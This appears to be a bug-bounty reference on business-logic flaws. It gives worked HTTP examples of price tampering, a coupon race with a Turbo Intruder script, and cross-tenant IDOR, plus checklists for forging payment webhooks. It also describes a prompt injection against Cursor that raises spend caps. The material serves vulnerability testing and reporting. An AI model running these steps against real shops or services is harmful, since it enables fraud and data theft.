# Business Logic Worked Examples & Integration Patterns

> Referenced from [business-logic SKILL.md](../SKILL.md) — concrete request/response examples, payment processor integration testing, and AI/LLM billing abuse patterns.

## Table of Contents

- [Worked Example 1: Price Manipulation via Payment Intent](#worked-example-1-price-manipulation-via-payment-intent)
- [Worked Example 2: Subscription Downgrade + Feature Retention](#worked-example-2-subscription-downgrade--feature-retention)
- [Worked Example 3: Coupon Race Condition Double-Spend](#worked-example-3-coupon-race-condition-double-spend)
- [Worked Example 4: Cross-Tenant Export IDOR](#worked-example-4-cross-tenant-export-idor)
- [Payment Processor Integration Patterns](#payment-processor-integration-patterns)
- [AI / LLM Billing Abuse Patterns](#ai--llm-billing-abuse-patterns)
- [False Positive Checklist](#false-positive-checklist)

---

## Worked Example 1: Price Manipulation via Payment Intent

**Pattern:** Application creates a Stripe (or similar) PaymentIntent with a client-supplied amount instead of computing it server-side from the cart.

### Step 1 — Intercept checkout initiation

```http
POST /api/checkout/create-intent HTTP/1.1
Host: shop.example.com
Content-Type: application/json
Cookie: session=abc123

{
  "cart_id": "cart_8f3a2b",
  "items": [
    {"product_id": "prod_laptop", "quantity": 1, "price": 129900}
  ],
  "currency": "usd"
}
```

### Step 2 — Modify price in the intercepted request

Change `"price": 129900` to `"price": 1`:

```http
POST /api/checkout/create-intent HTTP/1.1
Host: shop.example.com
Content-Type: application/json
Cookie: session=abc123

{
  "cart_id": "cart_8f3a2b",
  "items": [
    {"product_id": "prod_laptop", "quantity": 1, "price": 1}
  ],
  "currency": "usd"
}
```

### Step 3 — Server responds with manipulated amount

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "client_secret": "pi_3abc_secret_xyz",
  "amount": 1,
  "currency": "usd"
}
```

**The bug:** The server accepted the client-supplied price (1 cent) instead of looking up the product price from the database. The Stripe PaymentIntent was created for $0.01.

### Step 4 — Complete payment and verify

Complete the Stripe payment flow with the manipulated intent. Check:

```
□ Order confirmation email shows $0.01 charge
□ Stripe Dashboard shows PaymentIntent for $0.01
□ Order appears in account as fulfilled/pending-fulfillment
□ Product inventory decremented normally
```

### Evidence checklist

```
□ Intercepted request showing client-supplied price parameter
□ Server response confirming manipulated amount accepted
□ Order confirmation at manipulated price
□ Stripe Dashboard screenshot (or equivalent) showing the low-value charge
□ Show that a legitimate checkout for the same item charges full price
```

### Impact statement template

> An attacker can purchase any item for $0.01 by modifying the `price` parameter in the checkout initiation request. The server creates a Stripe PaymentIntent using the client-supplied amount without validating against the catalog price. With [X] daily orders averaging $[Y], this enables revenue loss of up to $[X×Y] per day.

**Variants:** Change `currency` to a lower-value currency (e.g., `inr`). Set `quantity` to `0` or `-1`. Add unexpected fields like `discount_code`. Modify `shipping_fee` or `tax` to `0`.

---

## Worked Example 2: Subscription Downgrade + Feature Retention

**Pattern:** Application enforces plan limits at subscription change time but doesn't re-validate on subsequent API calls.

### Step 1 — Confirm premium feature access

```http
GET /api/v1/analytics/export?format=csv&range=90d HTTP/1.1
Host: app.example.com
Authorization: Bearer eyJ...premium_user_token
```

```http
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="analytics-90d.csv"

date,metric,value
2026-01-01,revenue,45230
...
```

The `/analytics/export` endpoint is a premium-only feature (marked as "Pro Plan" in the UI).

### Step 2 — Downgrade to free plan

```http
POST /api/v1/billing/change-plan HTTP/1.1
Host: app.example.com
Authorization: Bearer eyJ...premium_user_token
Content-Type: application/json

{
  "plan_id": "free",
  "effective": "immediate"
}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "plan": "free",
  "status": "active",
  "features": ["basic_dashboard", "5_users"]
}
```

### Step 3 — Re-test premium endpoint on free plan

```http
GET /api/v1/analytics/export?format=csv&range=90d HTTP/1.1
Host: app.example.com
Authorization: Bearer eyJ...same_token
```

**Vulnerable response (feature retained):**

```http
HTTP/1.1 200 OK
Content-Type: text/csv

date,metric,value
2026-01-01,revenue,45230
...
```

**Secure response (properly enforced):**

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json

{"error": "This feature requires a Pro plan", "upgrade_url": "/billing/upgrade"}
```

### Evidence checklist

```
□ Premium feature accessible before downgrade (baseline)
□ Successful downgrade confirmation
□ Premium feature still accessible after downgrade
□ Account settings page confirms free plan
□ Compare against a fresh free-plan account (should get 403)
```

**Variants:** JWT contains `plan: "premium"` — token not refreshed after downgrade (claim persists until expiry). Try older API versions (`/api/v2/export`). Try internal endpoints (`/api/internal/export`). Test cancel-and-resubscribe loop during grace period for infinite free access.

---

## Worked Example 3: Coupon Race Condition Double-Spend

**Pattern:** Single-use coupon's "already used" check runs before the "mark as used" write, creating a race window.

### Step 1 — Identify the target

Find a single-use coupon code (`SAVE50`) that can only be redeemed once per account. The apply-coupon endpoint:

```http
POST /api/cart/apply-coupon HTTP/1.1
Host: shop.example.com
Cookie: session=abc123
Content-Type: application/json

{"coupon_code": "SAVE50"}
```

Normal response (first use):

```http
HTTP/1.1 200 OK
{"status": "applied", "discount": "50%", "new_total": 4999}
```

Normal response (second use):

```http
HTTP/1.1 400 Bad Request
{"error": "Coupon already used"}
```

### Step 2 — HTTP/2 single-packet attack

Send 20 identical apply-coupon requests in a single TCP packet using Turbo Intruder:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Queue 20 identical requests with gate
    for i in range(20):
        engine.queue(target.req, gate='race1')

    # Release all at once
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Step 3 — Analyze responses

Of 20 requests sent simultaneously:

```
Requests returning 200 (coupon applied): 3
Requests returning 400 (already used):  17
```

**The bug:** Three requests hit the "check if used" query before any of them completed the "mark as used" write. All three got the coupon applied.

### Step 4 — Verify the race succeeded

```http
GET /api/cart HTTP/1.1
Host: shop.example.com
Cookie: session=abc123
```

```http
HTTP/1.1 200 OK
{
  "items": [{"name": "Widget", "price": 9999}],
  "discounts": [
    {"code": "SAVE50", "amount": -4999},
    {"code": "SAVE50", "amount": -4999},
    {"code": "SAVE50", "amount": -4999}
  ],
  "total": -4998
}
```

### Evidence checklist

```
□ Show the coupon is single-use (second sequential request fails)
□ Show multiple 200 responses from parallel requests (Turbo Intruder output)
□ Show the cart/order with multiple discounts applied
□ Calculate financial impact: discount × number of successful applications
□ If total goes negative, check if a credit/refund is generated
```

**Root cause:** Check-then-act without database-level locking. Fix requires an atomic `UPDATE ... WHERE used = false` with row-count check.

**Real-world grounding:** Stripe HackerOne #1849626 ($5K payout) — researcher raced `/ajax/accept_fee_discount_offer` 30 times via Turbo Intruder, applying $600K in fee-free transactions. Stripe's first fix was also bypassed via the same race window. Also: HackerOne #1717650 (Stripe promo code race), HackerOne #759247 (Reverb.com coupon race), GHSA-67jg-m6f3-473g (alf.io promo code race).

---

## Worked Example 4: Cross-Tenant Export IDOR

**Pattern:** Data export endpoint accepts an `org_id` parameter without verifying the requesting user belongs to that organization.

### Step 1 — Legitimate export request

```http
POST /api/v1/reports/export HTTP/1.1
Host: saas.example.com
Authorization: Bearer eyJ...user_in_org_100
Content-Type: application/json

{
  "org_id": 100,
  "report_type": "user_activity",
  "date_range": {"start": "2026-01-01", "end": "2026-03-01"},
  "format": "csv"
}
```

```http
HTTP/1.1 202 Accepted
{
  "export_id": "exp_abc123",
  "status": "processing",
  "download_url": null
}
```

### Step 2 — Swap org_id to target tenant

```http
POST /api/v1/reports/export HTTP/1.1
Host: saas.example.com
Authorization: Bearer eyJ...user_in_org_100
Content-Type: application/json

{
  "org_id": 101,
  "report_type": "user_activity",
  "date_range": {"start": "2026-01-01", "end": "2026-03-01"},
  "format": "csv"
}
```

**Vulnerable response:**

```http
HTTP/1.1 202 Accepted
{
  "export_id": "exp_def456",
  "status": "processing",
  "download_url": null
}
```

**Secure response:**

```http
HTTP/1.1 403 Forbidden
{"error": "You do not have access to this organization"}
```

### Step 3 — Download the cross-tenant export

Poll the export status, then download:

```http
GET /api/v1/reports/export/exp_def456/download HTTP/1.1
Host: saas.example.com
Authorization: Bearer eyJ...user_in_org_100
```

```http
HTTP/1.1 200 OK
Content-Type: text/csv

user_id,email,last_login,role,actions_count
1001,admin@competitor.com,2026-02-28,admin,4521
1002,user@competitor.com,2026-02-27,member,892
...
```

### Evidence checklist

```
□ Successful export of own org's data (baseline — proves the feature works)
□ Successful export of different org's data (proof of IDOR)
□ Downloaded CSV/data showing cross-tenant content
□ Show that your token is for org 100 (decode JWT or show account settings)
□ Estimate scope: test with org_id = 102, 103... to show systematic access
```

**Escalation:** Try other report types (`billing`, `audit_log`, `api_keys`). If credentials are exportable cross-tenant → Critical (ATO at scale). Test sequential org_ids to show systematic access.

---

## Payment Processor Integration Patterns

### Stripe-Specific Testing

| Pattern | Where bugs live |
|---------|----------------|
| **Checkout Sessions** | Server uses client-supplied price instead of Stripe Price object ID (`price_xxx`) |
| **Payment Intents** | Amount in PaymentIntent comes from frontend, not server-side cart calculation |

```
□ Client-side amount — Modify amount/price in the create-session request. Secure: server uses Price IDs
□ Webhook signature bypass — POST forged checkout.session.completed without Stripe-Signature header → orders fulfilled without payment. CVE-2026-1461 (empty by default), CVE-2026-21894 (n8n never verifies). Enumerate: /api/webhooks/stripe, /api/stripe/webhook, /webhook/stripe, /stripe/webhook, /payment/callback
□ 3DS Knock-to-Unlock — App adds 3DS but doesn't update webhook logic: customer.subscription.created fires before payment confirmation. Check subscription status attribute (must be "active"), not just event type
□ Metadata trust — Checkout Session metadata trusted by fulfillment handler without re-validation → attacker-controlled metadata drives order fulfillment
□ express.json() ordering — If Express middleware parses JSON body before Stripe SDK, signature verification silently fails (raw body destroyed)
□ Customer Portal IDOR — /api/billing/portal accepts client-supplied customer_id → access another customer's billing
□ Subscription upgrade without charge — PUT /api/subscription with premium plan_id, server doesn't validate price delta
□ Idempotency key replay — Replay Idempotency-Key from successful payment with different amount; Stripe returns cached result but app may use request body for fulfillment
```

### PayPal-Specific Testing

```
□ IPN spoofing — POST forged payment_status=Completed to IPN handler. Secure: app verifies via paypal.com/cgi-bin/webscr?cmd=_notify-validate
□ Amount mismatch — Complete PayPal payment for $1 on a $100 order. Many apps check payment_status but not mc_gross
□ Currency mismatch — Complete payment in different currency; app may not verify mc_currency
□ Transaction ID reuse — Replay a legitimate completed transaction ID for a new order
```

### Generic Payment Processor Tests

```
□ Payment callback race — Hit "confirm order" + send payment callback simultaneously → duplicate order, single payment
□ Refund to different method — Pay with method A, request refund to method B via API
□ Partial payment — Split payment (card + credits), complete card only, skip credits → order fulfills with partial payment
□ Zero-amount exploit — Stack discounts/credits to $0 total; check if checkout skips payment validation entirely
```

---

## AI / LLM Billing Abuse Patterns

AI SaaS products (API providers, AI-powered tools) have unique billing surfaces because they meter by usage (tokens, API calls, compute time) rather than by seat or feature.

### Token / Usage Manipulation

```
□ Token count mismatch — Check if billed tokens match actual usage. If system prompts are cached and not re-billed, stuff context there for unbilled processing
□ Streaming billing gap — Same prompt via streaming vs non-streaming; some implementations undercount streamed output tokens
□ Model tier confusion — Specify cheap model in request body to expensive-model endpoint. Check: premium results at cheap pricing? Reverse: billed for premium but get cheap results?
□ Batch API underpricing — Batch endpoints accept single requests → single requests at bulk discount pricing
□ Rate limit tier confusion — Free-tier API key at premium request rate; create multiple free keys to multiply limits
```

### AI Feature Access Bypass

```
□ Premium model on free tier — Free tier restricts model A; call API with model=B. Common gap: auth validated but not model entitlement
□ Fine-tuning cost bypass — Submit job, cancel before completion; check for partial-result access. Test cross-tenant billing
□ Vector store quota race — 10 parallel uploads when 1 slot remains → 10 vectors stored (race window in quota check)
□ Tool usage billing — Prompt AI to call expensive tools (web search, code exec) in a loop; check if tool usage is metered per plan
```

### Denial of Wallet (DoW) — OWASP LLM10:2025

```
□ Budget cap bypass — OX Security (Dec 2025): Cursor deeplink chain injects prompt → opens billing modal → edits spend cap to $1M+ without admin perms → infinite request loop drains budget. Test: Can non-admins modify team spending limits via API?
□ Streaming billing black hole — Client sends prompt with early stop word + time-consuming task, disconnects after stop word. Upstream completes computation but gateway never receives final usage metrics. Affects intermediate gateways/proxies, not first-party billing
□ Usage info suppression — OpenAI's include_usage defaults to off during streaming. Gateway billing based on this field → zero token counts
□ API key scope bypass — OpenAI: user API keys bill to org, bypassing project-level budget limits. No mechanism to force project-scoped keys. Test: org-level keys vs project-level budget enforcement
□ Completion callback spoofing — Forge async AI completion callback with manipulated results; check callback authentication
□ Credit purchase manipulation — Buy token credits via payment flow; modify credit amount client-side (same as price manipulation)
```

---

## False Positive Checklist

Before reporting a business logic bug, verify these aren't false positives:

```
□ Server-side validation actually exists but is async
  Some apps validate price on fulfillment, not on checkout creation
  Test: Does the order actually ship/fulfill at the manipulated price?
  Wait for the full order lifecycle before reporting

□ Sandbox/test mode
  Payment processors have test modes (Stripe test keys start with sk_test_)
  A "bug" in test mode may not exist in production
  Check: Are you testing against live mode or test mode?

□ Intentional free tier behavior
  Some features appear "premium" in the UI but are actually unrestricted in the API
  Check: Documentation, public API docs, or changelog may confirm this is intentional

□ Coupon stacking is by design
  Some platforms intentionally allow stacking discounts
  Check: Are there terms of service or help docs about discount stacking?

□ Grace period is documented
  Subscription downgrades with grace periods are normal business practice
  Only report if: grace period is significantly longer than documented,
  or the cancel/resubscribe loop creates infinite free access

□ Race condition without actual double-spend
  Getting two 200 responses doesn't mean the coupon was applied twice
  Verify: Check the final cart/order total — the backend may have deduped
  Also check: Database state, not just API responses
```

